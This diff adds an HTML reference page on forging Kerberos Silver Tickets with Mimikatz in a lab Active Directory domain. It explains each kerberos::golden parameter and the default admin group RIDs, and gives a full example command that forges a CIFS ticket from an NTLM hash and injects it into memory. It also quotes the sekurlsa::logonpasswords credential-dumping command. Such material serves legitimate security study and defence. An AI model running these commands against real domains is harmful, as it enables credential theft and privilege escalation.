@@ -1,0 +1,38 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Silver Tickets With Mimikatz</title>
+</head><body><b>Mimikatz Silver Ticket Command Reference</b><br/>
+The Mimikatz command to create a golden or silver ticket is “kerberos::golden”<br/>
+<br/>
+/domain &#09;&#09;– the fully qualified domain name. In this example: “lab.adsecurity.org”.<br/>
+/sid &#09;&#09;&#09;– the SID of the domain. In this example: “S-1-5-21-1473643419-774954089-2222329127”.<br/>
+/user &#09;&#09;– username to impersonate<br/>
+/groups (optional)&#09; – group RIDs the user is a member of (the first is the primary group)<br/>
+default: 513,512,520,518,519 for the well-known Administrator’s groups (listed below).<br/>
+/ticket (optional) &#09; – provide a path and name for saving the Golden Ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.<br/>
+/ptt &#09;&#09;&#09;– as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use.<br/>
+/id (optional) &#09;– user RID. Mimikatz default is 500 (the default Administrator account RID).<br/>
+/startoffset (optional) &#09;– the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.<br/>
+/endin (optional) &#09;– ticket lifetime. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).<br/>
+/renewmax (optional) &#09;– maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).<br/>
+<br/>
+<b>Silver Ticket Required Parameters:</b><br/>
+<br/>
+/target &#09;– the target server’s FQDN.<br/>
+/service &#09;– the kerberos service running on the target server. This is the Service Principal Name class (or type) such as cifs, http, mssql.<br/>
+/rc4 &#09;&#09;– the NTLM hash for the service (computer account or user account)<br/>
+&nbsp;<br/>
+<br/>
+<b>Silver Ticket Default Groups:</b><br/>
+Domain Users SID: S-1-5-21&lt;DOMAINID&gt;-513<br/>
+Domain Admins SID: S-1-5-21&lt;DOMAINID&gt;-512<br/>
+Schema Admins SID: S-1-5-21&lt;DOMAINID&gt;-518<br/>
+Enterprise Admins SID: S-1-5-21&lt;DOMAINID&gt;-519<br/>
+Group Policy Creator Owners SID: S-1-5-21&lt;DOMAINID&gt;-520<br/>
+<br/>
+<b>Example Mimikatz Command to Create a Silver Ticket:</b><br/>
+The following Mimikatz command creates a Silver Ticket for the CIFS service on the server adsmswin2k8r2.lab.adsecurity.org. In order for this Silver Ticket to be successfully created, the AD computer account password hash for adsmswin2k8r2.lab.adsecurity.org needs to be discovered, either from an AD domain dump or by running Mimikatz on the local system as shown above (Mimikatz “privilege::debug” “sekurlsa::logonpasswords” exit). The NTLM password hash is used with the /rc4 paramteer. The service SPN type also needs to be identified in the /service parameter. Finally, the target computer’s fully-qualified domain name needs to be provided in the /target parameter. Don’t forget the domain SID in the /sid parameter.<br/>
+<br/>
+mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit</body></html>
